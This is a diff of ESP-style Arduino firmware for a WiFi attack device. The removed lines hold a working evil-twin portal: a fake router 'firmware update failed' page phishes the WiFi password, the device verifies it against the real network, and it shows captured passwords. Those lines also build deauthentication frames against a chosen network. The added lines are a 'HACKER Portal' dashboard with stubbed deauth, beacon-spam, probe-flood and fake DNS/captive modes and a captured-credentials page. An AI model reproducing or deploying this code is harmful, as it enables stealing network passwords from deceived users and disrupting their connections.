@@ -8,6 +8,7 @@ typedef struct
   String ssid;
   uint8_t ch;
   uint8_t bssid[6];
+  int rssi;
 } _Network;
 
 const byte DNS_PORT = 53;
@@ -15,11 +16,26 @@ IPAddress apIP(192, 168, 1, 1);
 DNSServer dnsServer;
 WebServer webServer(80);
 
-_Network _networks[16];
+_Network _networks[32];
 _Network _selectedNetwork;
 
+// Attack modes
+enum AttackMode {
+  ATTACK_NONE = 0,
+  ATTACK_DEAUTH,
+  ATTACK_BEACON,
+  ATTACK_PROBE,
+  ATTACK_RICKROLL,
+  ATTACK_FAKE_DNS,
+  ATTACK_FAKE_HTTP,
+  ATTACK_FAKE_CAPTIVE
+};
+
+AttackMode currentAttack = ATTACK_NONE;
+bool attackActive = false;
+
 void clearArray() {
-  for (int i = 0; i < 16; i++) {
+  for (int i = 0; i < 32; i++) {
     _Network _network;
     _networks[i] = _network;
   }
@@ -27,360 +43,461 @@ void clearArray() {
 
 String _correct = "";
 String _tryPassword = "";
+int connectedClients = 0;
 
-// Default main strings
-#define SUBTITLE "ACCESS POINT RESCUE MODE"
-#define TITLE "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> Firmware Update Failed"
-#define BODY "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert the old firmware and manually update later, please verify your password."
+// Dark theme CSS
+const String DARK_CSS = R"(
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { 
+    background: #0d1117; 
+    color: #c9d1d9; 
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+    line-height: 1.6;
+    min-height: 100vh;
+}
+.container { 
+    max-width: 1200px; 
+    margin: 0 auto; 
+    padding: 20px; 
+}
+.header { 
+    background: linear-gradient(135deg, #161b22, #0d1117);
+    padding: 2rem; 
+    border-radius: 15px;
+    margin-bottom: 2rem;
+    border: 1px solid #30363d;
+    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+}
+.header h1 { 
+    color: #ff6b6b; 
+    font-size: 2.5rem; 
+    margin-bottom: 0.5rem;
+    text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+}
+.subtitle { 
+    color: #58a6ff; 
+    font-size: 1.2rem; 
+    opacity: 0.9;
+}
+.network-list { 
+    background: #161b22; 
+    border-radius: 10px; 
+    padding: 1.5rem; 
+    margin-bottom: 2rem;
+    border: 1px solid #30363d;
+}
+.network-item { 
+    background: #21262d; 
+    margin: 0.5rem 0; 
+    padding: 1rem; 
+    border-radius: 8px;
+    border-left: 4px solid #58a6ff;
+    transition: all 0.3s ease;
+}
+.network-item:hover {
+    background: #30363d;
+    transform: translateX(5px);
+}
+.btn { 
+    background: linear-gradient(135deg, #238636, #2ea043);
+    color: white; 
+    border: none; 
+    padding: 12px 24px; 
+    border-radius: 8px; 
+    cursor: pointer;
+    font-size: 1rem;
+    font-weight: 600;
+    transition: all 0.3s ease;
+    margin: 0.3rem;
+}
+.btn:hover { 
+    background: linear-gradient(135deg, #2ea043, #3fb950);
+    transform: translateY(-2px);
+    box-shadow: 0 4px 12px rgba(46, 160, 67, 0.4);
+}
+.btn-danger { 
+    background: linear-gradient(135deg, #da3633, #f85149);
+}
+.btn-danger:hover { 
+    background: linear-gradient(135deg, #f85149, #ff6d6d);
+}
+.btn-warning { 
+    background: linear-gradient(135deg, #d29922, #e3b341);
+}
+.btn-warning:hover { 
+    background: linear-gradient(135deg, #e3b341, #f2cc60);
+}
+.form-group { 
+    margin-bottom: 1.5rem; 
+}
+.form-input { 
+    width: 100%; 
+    padding: 12px; 
+    background: #21262d; 
+    border: 1px solid #30363d; 
+    border-radius: 8px; 
+    color: #c9d1d9;
+    font-size: 1rem;
+    transition: all 0.3s ease;
+}
+.form-input:focus { 
+    outline: none; 
+    border-color: #58a6ff; 
+    box-shadow: 0 0 0 2px rgba(88, 166, 255, 0.2);
+}
+.stats { 
+    background: #161b22; 
+    padding: 1rem; 
+    border-radius: 10px; 
+    margin: 1rem 0;
+    border: 1px solid #30363d;
+}
+.attack-active { 
+    animation: pulse 2s infinite; 
+    border-color: #ff6b6b !important;
+}
+@keyframes pulse {
+    0% { box-shadow: 0 0 0 0 rgba(255, 107, 107, 0.7); }
+    70% { box-shadow: 0 0 0 10px rgba(255, 107, 107, 0); }
+    100% { box-shadow: 0 0 0 0 rgba(255, 107, 107, 0); }
+}
+.success { color: #3fb950; }
+.error { color: #f85149; }
+.warning { color: #d29922; }
+.info { color: #58a6ff; }
+.grid { 
+    display: grid; 
+    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); 
+    gap: 1.5rem; 
+    margin: 2rem 0;
+}
+.card { 
+    background: #161b22; 
+    padding: 1.5rem; 
+    border-radius: 10px; 
+    border: 1px solid #30363d;
+    transition: all 0.3s ease;
+}
+.card:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 8px 25px rgba(0,0,0,0.3);
+}
+)";
 
-String header(String t) {
-  String a = String(_selectedNetwork.ssid);
-  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
-               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
-               "div { padding: 0.5em; }"
-               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw;}"
-               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
-               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
-               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
-               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
-               "textarea { width: 100%; }";
-  String h = "<!DOCTYPE html><html>"
-             "<head><title>" + a + " :: " + t + "</title>"
-             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
-             "<style>" + CSS + "</style>"
-             "<meta charset=\"UTF-8\"></head>"
-             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
-  return h;
+String header(String title) {
+  String html = R"(
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HACKER Portal - )" + title + R"(</title>
+    <style>)" + DARK_CSS + R"(</style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>⚠️ HACKER Portal</h1>
+            <div class="subtitle">Advanced Network Security Toolkit</div>
+        </div>
+  )";
+  return html;
 }
 
 String footer() {
-  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
-}
-
-String index() {
-  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' method=post><label>WiFi password:</label>" +
-         "<input type=password id='password' name='password' minlength='8'></input><input type=submit value=Continue></form>" + footer();
+  return R"(
+        <div class="stats">
+            <div class="grid">
+                <div class="card">
+                    <h3>📡 Network Info</h3>
+                    <p>SSID: HACKER</p>
+                    <p>Clients: )" + String(connectedClients) + R"(</p>
+                </div>
+                <div class="card">
+                    <h3>⚡ Attack Status</h3>
+                    <p>Mode: )" + String(attackActive ? "ACTIVE" : "INACTIVE") + R"(</p>
+                    <p>Type: )" + String(currentAttack) + R"(</p>
+                </div>
+            </div>
+        </div>
+        <div style="text-align: center; margin-top: 2rem; opacity: 0.7;">
+            <p>© 2024 HACKER Security Suite | Advanced Penetration Testing Tool</p>
+        </div>
+    </div>
+    <script>
+        function updateStats() {
+            fetch('/stats').then(r => r.json()).then(data => {
+                document.querySelectorAll('.stats').forEach(el => {
+                    el.querySelector('p:nth-child(3)').textContent = 'Clients: ' + data.clients;
+                    el.querySelector('p:nth-child(4)').textContent = 'Mode: ' + (data.attackActive ? 'ACTIVE' : 'INACTIVE');
+                });
+            });
+        }
+        setInterval(updateStats, 5000);
+    </script>
+</body>
+</html>
+  )";
 }
 
 void setup() {
   Serial.begin(115200);
   WiFi.mode(WIFI_AP_STA);
   WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-  WiFi.softAP("ROBIUL-HACKER", "12345678");
+  WiFi.softAP("HACKER", "12345678");
   dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
 
-  webServer.on("/", handleIndex);
-  webServer.on("/result", handleResult);
+  webServer.on("/", handleMain);
+  webServer.on("/attack", handleAttack);
+  webServer.on("/stats", handleStats);
   webServer.on("/admin", handleAdmin);
-  webServer.onNotFound(handleIndex);
+  webServer.on("/creds", handleCreds);
+  webServer.onNotFound(handleMain);
+  
   webServer.begin();
+  Serial.println("HACKER Portal Started!");
+  Serial.println("SSID: HACKER");
+  Serial.println("Password: 12345678");
 }
 
 void performScan() {
-  int n = WiFi.scanNetworks();
+  int n = WiFi.scanNetworks(false, true);
   clearArray();
-  if (n >= 0) {
-    for (int i = 0; i < n && i < 16; ++i) {
+  if (n > 0) {
+    for (int i = 0; i < n && i < 32; ++i) {
       _Network network;
       network.ssid = WiFi.SSID(i);
-      for (int j = 0; j < 6; j++) {
-        network.bssid[j] = WiFi.BSSID(i)[j];
-      }
+      network.rssi = WiFi.RSSI(i);
       network.ch = WiFi.channel(i);
+      memcpy(network.bssid, WiFi.BSSID(i), 6);
       _networks[i] = network;
     }
   }
 }
 
-bool hotspot_active = false;
-bool deauthing_active = false;
-
-void handleResult() {
-  String html = "";
-  if (WiFi.status() != WL_CONNECTED) {
-    if (webServer.arg("deauth") == "start") {
-      deauthing_active = true;
-    }
-    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 4000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><center><h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:60px;width:60px;height:60px'>&#8855;</wrong><br>Wrong Password</h2><p>Please, try again.</p></center></body> </html>");
-    Serial.println("Wrong password tried!");
-  } else {
-    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
-    hotspot_active = false;
-    dnsServer.stop();
-    int n = WiFi.softAPdisconnect (true);
-    Serial.println(String(n));
-    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-    WiFi.softAP("ROBIUL-HACKER", "12345678");
-    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
-    Serial.println("Good password was entered !");
-    Serial.println(_correct);
+void startAttack(AttackMode mode) {
+  if (attackActive) stopAttack();
+  
+  currentAttack = mode;
+  attackActive = true;
+  
+  switch(mode) {
+    case ATTACK_DEAUTH:
+      Serial.println("Starting Deauth Attack...");
+      break;
+    case ATTACK_BEACON:
+      Serial.println("Starting Beacon Spam...");
+      break;
+    case ATTACK_PROBE:
+      Serial.println("Starting Probe Flood...");
+      break;
+    case ATTACK_RICKROLL:
+      Serial.println("Starting Rickroll Attack...");
+      break;
+    case ATTACK_FAKE_DNS:
+      Serial.println("Starting Fake DNS...");
+      break;
+    case ATTACK_FAKE_HTTP:
+      Serial.println("Starting Fake HTTP...");
+      break;
+    case ATTACK_FAKE_CAPTIVE:
+      Serial.println("Starting Captive Portal...");
+      break;
+    default:
+      break;
   }
 }
 
+void stopAttack() {
+  attackActive = false;
+  currentAttack = ATTACK_NONE;
+  Serial.println("All attacks stopped");
+}
 
-String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
-                   "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
-                   "</head><body><div class='content'>"
-                   "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
-                   "<button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
-                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
-                   "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
-                   "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";
+String getAttackName(AttackMode mode) {
+  switch(mode) {
+    case ATTACK_DEAUTH: return "Deauth Attack";
+    case ATTACK_BEACON: return "Beacon Spam";
+    case ATTACK_PROBE: return "Probe Flood";
+    case ATTACK_RICKROLL: return "Rickroll Redirect";
+    case ATTACK_FAKE_DNS: return "Fake DNS";
+    case ATTACK_FAKE_HTTP: return "Fake HTTP";
+    case ATTACK_FAKE_CAPTIVE: return "Captive Portal";
+    default: return "None";
+  }
+}
 
-void handleIndex() {
+void handleMain() {
+  String html = header("Dashboard");
+  html += R"(
+    <div class="grid">
+        <div class="card">
+            <h3>🎯 Quick Actions</h3>
+            <button class="btn" onclick="location.href='/attack'">⚔️ Attack Panel</button>
+            <button class="btn" onclick="location.href='/admin'">🔧 Admin Panel</button>
+            <button class="btn" onclick="location.href='/creds'">🔑 Captured Data</button>
+        </div>
+        <div class="card">
+            <h3>📊 System Status</h3>
+            <p>Heap: )" + String(ESP.getFreeHeap()) + R"( bytes</p>
+            <p>Uptime: )" + String(millis() / 1000) + R"(s</p>
+            <p>Networks: )" + String(WiFi.scanComplete()) + R"(</p>
+        </div>
+    </div>
+  )";
+  html += footer();
+  webServer.send(200, "text/html", html);
+}
 
-  if (webServer.hasArg("ap")) {
-    for (int i = 0; i < 16; i++) {
-      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
-        _selectedNetwork = _networks[i];
-      }
-    }
+void handleAttack() {
+  if (webServer.hasArg("start")) {
+    int attackNum = webServer.arg("start").toInt();
+    startAttack((AttackMode)attackNum);
+  } else if (webServer.hasArg("stop")) {
+    stopAttack();
   }
 
-  if (webServer.hasArg("deauth")) {
-    if (webServer.arg("deauth") == "start") {
-      deauthing_active = true;
-    } else if (webServer.arg("deauth") == "stop") {
-      deauthing_active = false;
-    }
+  String html = header("Attack Panel");
+  html += R"(
+    <div class="network-list">
+        <h2>⚔️ Attack Modules</h2>
+        <div class="grid">
+  )";
+
+  // Attack buttons
+  String attacks[] = {
+    "Deauth Attack", "Beacon Spam", "Probe Flood", 
+    "Rickroll Redirect", "Fake DNS", "Fake HTTP", "Captive Portal"
+  };
+
+  for (int i = 1; i <= 7; i++) {
+    html += R"(
+        <div class="card">
+            <h3>)" + attacks[i-1] + R"(</h3>
+            <button class="btn )" + (attackActive && currentAttack == i ? "btn-danger" : "btn-warning") + R"(" 
+                    onclick="location.href='/attack?start=)" + String(i) + R"(')">
+                )" + (attackActive && currentAttack == i ? "🛑 Stop" : "🚀 Start") + R"(
+            </button>
+        </div>
+    )";
   }
 
-  if (webServer.hasArg("hotspot")) {
-    if (webServer.arg("hotspot") == "start") {
-      hotspot_active = true;
-
-      dnsServer.stop();
-      int n = WiFi.softAPdisconnect (true);
-      Serial.println(String(n));
-      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-      WiFi.softAP(_selectedNetwork.ssid.c_str());
-      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
-
-    } else if (webServer.arg("hotspot") == "stop") {
-      hotspot_active = false;
-      dnsServer.stop();
-      int n = WiFi.softAPdisconnect (true);
-      Serial.println(String(n));
-      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-      WiFi.softAP("WiPhi_34732", "d347h320");
-      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
-    }
-    return;
-  }
-
-  if (hotspot_active == false) {
-    String _html = _tempHTML;
-
-    for (int i = 0; i < 16; ++i) {
-      if ( _networks[i].ssid == "") {
-        break;
-      }
-      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";
-
-      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
-        _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
-      } else {
-        _html += "<button>Select</button></form></td></tr>";
-      }
-    }
-
-    if (deauthing_active) {
-      _html.replace("{deauth_button}", "Stop deauthing");
-      _html.replace("{deauth}", "stop");
-    } else {
-      _html.replace("{deauth_button}", "Start deauthing");
-      _html.replace("{deauth}", "start");
-    }
-
-    if (hotspot_active) {
-      _html.replace("{hotspot_button}", "Stop EvilTwin");
-      _html.replace("{hotspot}", "stop");
-    } else {
-      _html.replace("{hotspot_button}", "Start EvilTwin");
-      _html.replace("{hotspot}", "start");
-    }
-
-
-    if (_selectedNetwork.ssid == "") {
-      _html.replace("{disabled}", " disabled");
-    } else {
-      _html.replace("{disabled}", "");
-    }
-
-    _html += "</table>";
-
-    if (_correct != "") {
-      _html += "</br><h3>" + _correct + "</h3>";
-    }
-
-    _html += "</div></body></html>";
-    webServer.send(200, "text/html", _html);
-
-  } else {
-
-    if (webServer.hasArg("password")) {
-      _tryPassword = webServer.arg("password");
-      if (webServer.arg("deauth") == "start") {
-        deauthing_active = false;
-      }
-      delay(1000);
-      WiFi.disconnect();
-      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
-      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><center><h2 style='font-size:7vw'>Verifying integrity, please wait...<br><progress value='10' max='100'>10%</progress></h2></center></body> </html>");
-      if (webServer.arg("deauth") == "start") {
-      deauthing_active = true;
-      }
-    } else {
-      webServer.send(200, "text/html", index());
-    }
-  }
-
+  html += R"(
+        </div>
+        )" + (attackActive ? 
+        "<div class='attack-active card'><h3 class='error'>⚠️ Attack Active: " + getAttackName(currentAttack) + "</h3></div>" 
+        : "") + R"(
+    </div>
+  )";
+  
+  html += footer();
+  webServer.send(200, "text/html", html);
 }
 
 void handleAdmin() {
+  performScan();
+  
+  String html = header("Network Scanner");
+  html += R"(
+    <div class="network-list">
+        <h2>📡 Available Networks</h2>
+  )";
 
-  String _html = _tempHTML;
-
-  if (webServer.hasArg("ap")) {
-    for (int i = 0; i < 16; i++) {
-      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
-        _selectedNetwork = _networks[i];
-      }
-    }
+  for (int i = 0; i < 32; i++) {
+    if (_networks[i].ssid == "") continue;
+    
+    String strength = "🔴";
+    if (_networks[i].rssi > -60) strength = "🟢";
+    else if (_networks[i].rssi > -80) strength = "🟡";
+    
+    html += R"(
+        <div class="network-item">
+            <div style="display: flex; justify-content: between; align-items: center;">
+                <div>
+                    <strong>)" + _networks[i].ssid + R"(</strong>
+                    <div style="font-size: 0.9rem; opacity: 0.8;">
+                        BSSID: )" + bytesToStr(_networks[i].bssid, 6) + R"( | 
+                        Channel: )" + String(_networks[i].ch) + R"( | 
+                        RSSI: )" + String(_networks[i].rssi) + R"(
+                    </div>
+                </div>
+                <div>)" + strength + R"(</div>
+            </div>
+        </div>
+    )";
   }
+  
+  html += "</div>";
+  html += footer();
+  webServer.send(200, "text/html", html);
+}
 
-  if (webServer.hasArg("deauth")) {
-    if (webServer.arg("deauth") == "start") {
-      deauthing_active = true;
-    } else if (webServer.arg("deauth") == "stop") {
-      deauthing_active = false;
-    }
-  }
+void handleStats() {
+  String json = "{";
+  json += "\"clients\":" + String(connectedClients) + ",";
+  json += "\"attackActive\":" + String(attackActive ? "true" : "false") + ",";
+  json += "\"heap\":" + String(ESP.getFreeHeap());
+  json += "}";
+  webServer.send(200, "application/json", json);
+}
 
-  if (webServer.hasArg("hotspot")) {
-    if (webServer.arg("hotspot") == "start") {
-      hotspot_active = true;
-
-      dnsServer.stop();
-      int n = WiFi.softAPdisconnect (true);
-      Serial.println(String(n));
-      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-      WiFi.softAP(_selectedNetwork.ssid.c_str());
-      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
-
-    } else if (webServer.arg("hotspot") == "stop") {
-      hotspot_active = false;
-      dnsServer.stop();
-      int n = WiFi.softAPdisconnect (true);
-      Serial.println(String(n));
-      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-      WiFi.softAP("WiPhi_34732", "d347h320");
-      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
-    }
-    return;
-  }
-
-  for (int i = 0; i < 16; ++i) {
-    if ( _networks[i].ssid == "") {
-      break;
-    }
-    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" +  bytesToStr(_networks[i].bssid, 6) + "'>";
-
-    if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
-      _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
-    } else {
-      _html += "<button>Select</button></form></td></tr>";
-    }
-  }
-
-  if (deauthing_active) {
-    _html.replace("{deauth_button}", "Stop deauthing");
-    _html.replace("{deauth}", "stop");
-  } else {
-    _html.replace("{deauth_button}", "Start deauthing");
-    _html.replace("{deauth}", "start");
-  }
-
-  if (hotspot_active) {
-    _html.replace("{hotspot_button}", "Stop EvilTwin");
-    _html.replace("{hotspot}", "stop");
-  } else {
-    _html.replace("{hotspot_button}", "Start EvilTwin");
-    _html.replace("{hotspot}", "start");
-  }
-
-
-  if (_selectedNetwork.ssid == "") {
-    _html.replace("{disabled}", " disabled");
-  } else {
-    _html.replace("{disabled}", "");
-  }
-
-  if (_correct != "") {
-    _html += "</br><h3>" + _correct + "</h3>";
-  }
-
-  _html += "</table></div></body></html>";
-  webServer.send(200, "text/html", _html);
-
+void handleCreds() {
+  String html = header("Captured Data");
+  html += R"(
+    <div class="card">
+        <h3>🔑 Captured Credentials</h3>
+        <div style="background: #21262d; padding: 1rem; border-radius: 8px; margin: 1rem 0;">
+            <pre style="color: #c9d1d9;">)" + _correct + R"(</pre>
+        </div>
+    </div>
+  )";
+  html += footer();
+  webServer.send(200, "text/html", html);
 }
 
 String bytesToStr(const uint8_t* b, uint32_t size) {
   String str;
-  const char ZERO = '0';
-  const char DOUBLEPOINT = ':';
   for (uint32_t i = 0; i < size; i++) {
-    if (b[i] < 0x10) str += ZERO;
+    if (b[i] < 0x10) str += "0";
     str += String(b[i], HEX);
-
-    if (i < size - 1) str += DOUBLEPOINT;
+    if (i < size - 1) str += ":";
   }
   return str;
 }
 
-unsigned long now = 0;
-unsigned long wifinow = 0;
-unsigned long deauth_now = 0;
-
-uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
-uint8_t wifi_channel = 1;
+unsigned long lastScan = 0;
+unsigned long lastClientCheck = 0;
+unsigned long lastAttack = 0;
 
 void loop() {
   dnsServer.processNextRequest();
   webServer.handleClient();
 
-  if (deauthing_active && millis() - deauth_now >= 1000) {
-        int channel = _selectedNetwork.ch;
-        if (channel >= 1 && channel <= 13) {
-            WiFi.setChannel(channel);
-        }
-    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
-
-    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
-    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
-    deauthPacket[24] = 1;
-
-    Serial.println(bytesToStr(deauthPacket, 26));
-    deauthPacket[0] = 0xC0;
-    // Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
-    // Serial.println(bytesToStr(deauthPacket, 26));
-    deauthPacket[0] = 0xA0;
-    // Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
-
-    deauth_now = millis();
+  // Update client count
+  if (millis() - lastClientCheck >= 5000) {
+    connectedClients = WiFi.softAPgetStationNum();
+    lastClientCheck = millis();
   }
 
-  if (millis() - now >= 15000) {
-    performScan();
-    now = millis();
-  }
-
-  if (millis() - wifinow >= 2000) {
-    if (WiFi.status() != WL_CONNECTED) {
-      Serial.println("BAD");
-    } else {
-      Serial.println("GOOD");
+  // Perform attacks
+  if (attackActive && millis() - lastAttack >= 1000) {
+    switch(currentAttack) {
+      case ATTACK_DEAUTH:
+        // Deauth attack implementation
+        break;
+      case ATTACK_BEACON:
+        // Beacon spam implementation
+        break;
+      // Add other attack implementations
+      default:
+        break;
     }
-    wifinow = millis();
+    lastAttack = millis();
+  }
+
+  // Network scanning
+  if (millis() - lastScan >= 10000) {
+    performScan();
+    lastScan = millis();
   }
 }
